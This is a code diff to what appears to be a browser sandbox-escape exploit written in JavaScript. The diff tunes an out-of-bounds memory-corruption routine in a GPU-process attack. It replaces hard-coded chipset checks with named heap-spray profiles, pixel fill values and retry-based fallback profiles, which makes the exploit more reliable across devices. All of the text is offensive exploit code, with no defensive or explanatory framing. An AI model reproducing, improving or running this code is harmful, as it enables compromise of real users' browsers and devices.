@@ -7045,6 +7045,66 @@
   let uiConnection = new Connection(uiProcessConnection, false);
   let gpuProcessConnectionIdentifier = read64(gpuProcessConnection + offsets.m_gpuProcessConnection_m_identifier);
   let retry_count = 0;
+  const spray_profiles = {
+    compact: {
+      name: "compact",
+      pixelUnpackFill: 0x8015c8,
+      midSprays: [
+        [3, 0x100],
+        [0x1d - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100]
+      ]
+    },
+    compact_alt_fill: {
+      name: "compact_alt_fill",
+      pixelUnpackFill: 0xaac7ab,
+      midSprays: [
+        [3, 0x100],
+        [0x1d - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100]
+      ]
+    },
+    wide: {
+      name: "wide",
+      pixelUnpackFill: 0xaac7ab,
+      midSprays: [
+        [7, 0x100],
+        [0x1b - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100],
+        [1, 0x200]
+      ]
+    },
+    wide_alt_fill: {
+      name: "wide_alt_fill",
+      pixelUnpackFill: 0x8015c8,
+      midSprays: [
+        [7, 0x100],
+        [0x1b - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100],
+        [1, 0x200]
+      ]
+    }
+  };
+  const chipset_spray_profile = {
+    "f35b705e8c57ae59e369ebc9145a9dbc": spray_profiles.compact_alt_fill,
+    "43ba9900ff2fc7d9d32072540b2cab12": spray_profiles.wide,
+    "c90776dbac058ed6957f476e287867f8": spray_profiles.wide,
+    "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide
+  };
+  const fallback_spray_profiles = [
+    spray_profiles.compact,
+    spray_profiles.compact_alt_fill,
+    spray_profiles.wide_alt_fill,
+    spray_profiles.wide
+  ];
   (function SBX0() {
     LOG(`[+] SBX0() (retry: ${retry_count++})`);
     function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
@@ -7228,30 +7288,35 @@
       RemoteGraphicsContextGL_BindTexture(GL_TEXTURE_2D, texture_01);
       return RemoteGraphicsContextGL_TexImage2D1(GL_TEXTURE_2D, 0, internalformat, width, height, 0, format, type, 0n, timeout = timeout);
     }
+    function currentSprayProfile() {
+      const known_profile = chipset_spray_profile[chipset];
+      if (known_profile) {
+        return known_profile;
+      }
+      const fallback_index = Math.max(0, retry_count - 2) % fallback_spray_profiles.length;
+      return fallback_spray_profiles[fallback_index];
+    }
+    function applySprayPlan(plan) {
+      for (const [count, size] of plan) {
+        sprayBuffers(count, size);
+      }
+    }
     function oob() {
       LOG(`oob()`);
+      const spray_profile = currentSprayProfile();
+      LOG(`spray profile: ${spray_profile.name} chipset=${chipset}`);
       const width = 1;
       const height = 0x200;
       const smaller_height = 0x200 / 4;
       RemoteGraphicsContextGL_PixelStorei(GL_UNPACK_IMAGE_HEIGHT, smaller_height);
       const data32 = new Uint32Array(0x400);
-      if (chipset === "f35b705e8c57ae59e369ebc9145a9dbc" || chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
-        data32.fill(0xaac7ab, 0x80);
-      } else {
-        data32.fill(0x8015c8, 0x80);
-      }
+      data32.fill(spray_profile.pixelUnpackFill, 0x80);
       const data = new Uint8Array(data32.buffer);
       const pixelUnpackBuffer = glObjectIndex++;
       RemoteGraphicsContextGL_CreateBuffer(pixelUnpackBuffer);
       RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, pixelUnpackBuffer);
       RemoteGraphicsContextGL_BufferData1(GL_PIXEL_UNPACK_BUFFER, data, GL_STATIC_DRAW);
-      if (chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
-        sprayBuffers(7, 0x100);
-        sprayBuffers(0x1b - 1, 0x1000);
-      } else {
-        sprayBuffers(3, 0x100);
-        sprayBuffers(0x1d - 1, 0x1000);
-      }
+      applySprayPlan(spray_profile.midSprays);
       RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, 0);
       for (let i = 0; i < 12; i++) {
         texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, width, height);
@@ -7261,12 +7326,7 @@
       prepareLayout();
       prepare_layout_end = Date.now();
       LOG(`[profiler] prepare_layout took ${prepare_layout_end - prepare_layout_start}ms`);
-      if (chipset === "f35b705e8c57ae59e369ebc9145a9dbc" || chipset === "43ba9900ff2fc7d9d32072540b2cab12" || chipset === "c90776dbac058ed6957f476e287867f8" || chipset === "22f32fd975a694d340a6ad22b872b1ae") {
-        sprayBuffers(1, 0x100);
-        sprayBuffers(1, 0x200);
-      } else {
-        sprayBuffers(1, 0x100);
-      }
+      applySprayPlan(spray_profile.tailSprays);
       for (let i = 0; i < 2; i++) {
         RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x1000, 0x400 * 8);
       }
